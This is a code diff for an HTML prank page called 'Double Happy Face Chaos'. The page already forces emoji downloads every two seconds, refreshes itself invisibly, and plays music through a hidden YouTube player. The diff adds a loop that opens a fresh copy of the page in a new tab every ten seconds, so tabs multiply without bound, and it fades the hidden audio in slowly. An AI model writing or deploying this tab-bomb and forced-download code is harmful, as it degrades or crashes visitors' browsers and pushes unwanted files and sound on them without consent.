@@ -4,15 +4,14 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Double Happy Face Chaos with Background Music</title>
+    <title>Double Happy Face Chaos with Tab Loops</title>
     <style>
         body {
             font-family: sans-serif;
             text-align: center;
             margin-top: 50px;
         }
-        /* Hide the YouTube iframe visually */
-        #background-video {
+        #player {
             position: fixed;
             top: 0;
             left: 0;
@@ -25,7 +24,7 @@
 </head>
 <body>
     <h1>Double Happy Face Chaos 😄😃</h1>
-    <p>Two happy face emojis download every 2 seconds, with invisible page refresh and quiet background music.</p>
+    <p>Two happy face emojis download every 2 seconds, invisible background refresh, fading music, and new tab chaos.</p>
 
     <!-- YouTube IFrame for background music -->
     <div id="player"></div>
@@ -58,6 +57,11 @@
             backgroundRefresh();
         }, 2000);
 
+        // Open a new tab with the same page every 10 seconds for chaos
+        setInterval(() => {
+            window.open(location.href, '_blank');
+        }, 10000); // adjust interval as desired
+
         // Load YouTube IFrame API
         let tag = document.createElement('script');
         tag.src = "https://www.youtube.com/iframe_api";
@@ -83,8 +87,22 @@
         }
 
         function onPlayerReady(event) {
-            event.target.setVolume(12); // 12% volume
+            event.target.setVolume(0); // start at 0%
             event.target.playVideo();
+            
+            // Gradually fade volume to 12%
+            let targetVolume = 12;
+            let currentVolume = 0;
+            let step = 1; // increase volume by 1% each step
+            let interval = setInterval(() => {
+                if (currentVolume < targetVolume) {
+                    currentVolume += step;
+                    if (currentVolume > targetVolume) currentVolume = targetVolume;
+                    event.target.setVolume(currentVolume);
+                } else {
+                    clearInterval(interval);
+                }
+            }, 200); // increase every 200ms
         }
     </script>
 </body>
